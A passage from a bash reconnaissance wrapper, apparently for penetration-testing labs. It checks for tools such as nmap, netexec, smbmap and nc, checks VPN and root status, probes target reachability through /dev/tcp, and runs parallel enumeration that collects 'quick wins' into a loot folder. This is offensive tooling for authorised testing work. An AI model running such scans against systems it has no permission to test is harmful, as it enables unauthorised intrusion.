    # exec replaces this process; if it fails (no sudo), fall through with a warning
    warn "sudo exec failed — continuing without root (UDP and OS detection will be skipped)"
fi

#------------------------------------------------------------------------------
# PRE-FLIGHT CHECKS
#------------------------------------------------------------------------------
header "OffSec RECON WRAPPER — Pre-Flight Check"

# ── Workspace resolution — verify this is correct before continuing ──────────
_invoking_user="${SUDO_USER:-$(id -un)}"
_effective_user="$(id -un)"
echo -e "${BOLD}  Invoking user   :${NC} ${_invoking_user}"
echo -e "${BOLD}  Effective user  :${NC} ${_effective_user}"
echo -e "${BOLD}  Workspace root  :${NC} ${TOOLKIT_ROOT}"
echo -e "${BOLD}  Recon output    :${NC} ${RECON_DIR}"
unset _invoking_user _effective_user
echo ""
# ─────────────────────────────────────────────────────────────────────────────

# Check critical tools. rustscan is optional because nmap full-TCP fallback now
# preserves coverage when rustscan is not installed or fails.
CRITICAL_TOOLS=(nmap)
OPTIONAL_TOOLS=(gobuster nikto whatweb enum4linux-ng smbmap smbclient snmpwalk \
                onesixtyone curl wget feroxbuster netexec nc \
                rpcclient showmount dig ldapsearch psql mysql rustscan \
                sslscan openssl wafw00f dnsrecon nmblookup nbtscan snmp-check \
                jq httpx-toolkit gowitness eyewitness davtest cadaver)

echo ""
info "Checking critical tools..."
for tool in "${CRITICAL_TOOLS[@]}"; do
    if ! check_tool "$tool"; then
        error "CRITICAL: $tool is required but not installed"
        exit 1
    else
        success "  $tool — OK"
    fi
done

echo ""
info "Checking optional tools..."
MISSING_OPTIONAL=()
for tool in "${OPTIONAL_TOOLS[@]}"; do
    if command -v "$tool" &>/dev/null; then
        echo -e "  ${GREEN}✓${NC} $tool"
    else
        echo -e "  ${YELLOW}✗${NC} $tool (not found — related enumeration will be skipped)"
        MISSING_OPTIONAL+=("$tool")
    fi
done

echo ""
info "Targets: ${TARGETS[*]}"
info "Output:  ${RECON_DIR}/"
info "Mode:    $(if [[ "$AUTO_MODE" == "true" ]]; then echo "AUTO (no prompts)"; else echo "INTERACTIVE"; fi)"
info "UDP:     Top $UDP_TOP_PORTS ports"
info "Rustscan batch size: $RUSTSCAN_BATCH_SIZE"
echo ""

if (( ${#MISSING_OPTIONAL[@]} > 0 )); then
    warn "${#MISSING_OPTIONAL[@]} optional tool(s) missing — some enumeration will be skipped"
    warn "Install with: sudo apt install ${MISSING_OPTIONAL[*]}"
    echo ""
fi

# --- Connectivity pre-flight ---
info "Connectivity checks..."

# VPN check
if ip link show tun0 &>/dev/null; then
    local_ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    success "  VPN up (tun0: $local_ip)"
else
    local_ip=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
    if [[ -z "$local_ip" ]]; then
        local_ip=$(ip -4 route get 1 2>/dev/null | grep -oP 'src \K\S+' | head -1)
    fi
    if [[ -z "$local_ip" ]]; then
        local_ip="unknown"
        warn "  Could not determine local IP — check network interfaces"
    fi
    warn "  No VPN detected (tun0 not found) — using $local_ip"
    warn "  If this is the engagement, check your VPN connection!"
fi

# Root check (informational only — sudo re-exec already handled above)
if [[ $EUID -eq 0 ]]; then
    success "  Running as root — full scan capability"
else
    warn "  Not running as root — UDP scanning and OS detection will be limited"
    warn "  (Pass --no-sudo was set; continuing without privilege escalation)"
fi

# Target reachability
echo ""
info "Checking target reachability..."
UNREACHABLE_TARGETS=()
# shellcheck disable=SC2016
for target in "${TARGETS[@]}"; do
    if ping -c 1 -W 2 "$target" &>/dev/null; then
        success "  $target — reachable"
    elif timeout 3 bash -c 'echo "" > "/dev/tcp/$1/80" 2>/dev/null || echo "" > "/dev/tcp/$1/443" 2>/dev/null || echo "" > "/dev/tcp/$1/22" 2>/dev/null' -- "$target" 2>/dev/null; then
        success "  $target — reachable (ICMP blocked, but TCP ports responding)"
    else
        warn "  $target — NOT responding to ping or common ports"
        warn "    Check: Is the target up? Is your VPN connected? Is the IP correct?"
        UNREACHABLE_TARGETS+=("$target")
    fi
done

if (( ${#UNREACHABLE_TARGETS[@]} > 0 )) && [[ "$AUTO_MODE" != "true" ]]; then
    echo ""
    warn "${#UNREACHABLE_TARGETS[@]} target(s) appear unreachable."
    echo -n "Continue anyway? [Y/n] "
    read -r confirm
    case "$confirm" in
        [nN]*) echo "Aborted."; exit 0 ;;
    esac
fi
echo ""

# Confirmation (unless auto mode)
if [[ "$AUTO_MODE" != "true" ]]; then
    echo -e "${BOLD}Ready to start enumeration of ${#TARGETS[@]} target(s).${NC}"
    echo -n "Proceed? [Y/n] "
    read -r confirm
    case "$confirm" in
        [nN]*) echo "Aborted."; exit 0 ;;
    esac
fi

#------------------------------------------------------------------------------
# MAIN EXECUTION
#------------------------------------------------------------------------------
if ! mkdir -p "$RECON_DIR"; then
    error "Failed to create output directory: ${RECON_DIR}"
    exit 1
fi

START_TIME=$(date +%s)

# Quick-wins triage pass (runs before deep recon)
if [[ "$QUICK_WINS_MODE" == true ]]; then
    header "QUICK-WINS TRIAGE — 5 minutes per target"
    for target in "${TARGETS[@]}"; do
        qw_triage_target "$target"
    done
    qw_rank_targets
    if [[ "$QUICK_WINS_ONLY" == true ]]; then
        END_TIME=$(date +%s)
        ELAPSED=$(( END_TIME - START_TIME ))
        success "Quick-wins triage complete in ${ELAPSED}s"
        success "Run without --quick-wins-only for full enumeration"
        exit 0
    fi
    echo ""
    info "Proceeding to full enumeration..."
    echo ""
fi

if [[ "$SEQUENTIAL_TARGETS" == true ]]; then
    info "Sequential mode — scanning targets one at a time"
    for target in "${TARGETS[@]}"; do
        recon_target "$target"
    done
else
    info "Parallel mode — max ${MAX_PARALLEL_TARGETS} target(s) at once"
    for target in "${TARGETS[@]}"; do
        while (( $(jobs -rp | wc -l) >= MAX_PARALLEL_TARGETS )); do
            wait -n 2>/dev/null || true
        done
        recon_target "$target" &
    done
    wait
fi

END_TIME=$(date +%s)
ELAPSED=$(( END_TIME - START_TIME ))
MINUTES=$(( ELAPSED / 60 ))
SECONDS_REM=$(( ELAPSED % 60 ))

header "ALL TARGETS COMPLETE"
echo ""
success "Total time: ${MINUTES}m ${SECONDS_REM}s"
success "Results in: ${RECON_DIR}/"
echo ""
for target in "${TARGETS[@]}"; do
    echo -e "  ${CYAN}$target${NC} → ${RECON_DIR}/${target}/summary.txt"
done
echo ""
info "Quick wins across this run's targets:"
_qw_files=()
for _t in "${TARGETS[@]}"; do
    _qwf="${RECON_DIR}/${_t}/loot/quick_wins.txt"
    [[ -s "$_qwf" ]] && _qw_files+=("$_qwf")
done
if (( ${#_qw_files[@]} > 0 )); then
    sort -u "${_qw_files[@]}" 2>/dev/null | while IFS= read -r line; do
        echo -e "  ${GREEN}★${NC} $line"
    done
else
    echo "  (no quick wins captured this run)"
fi
echo ""
echo -e "${BOLD}Good luck on the engagement! 🎯${NC}"
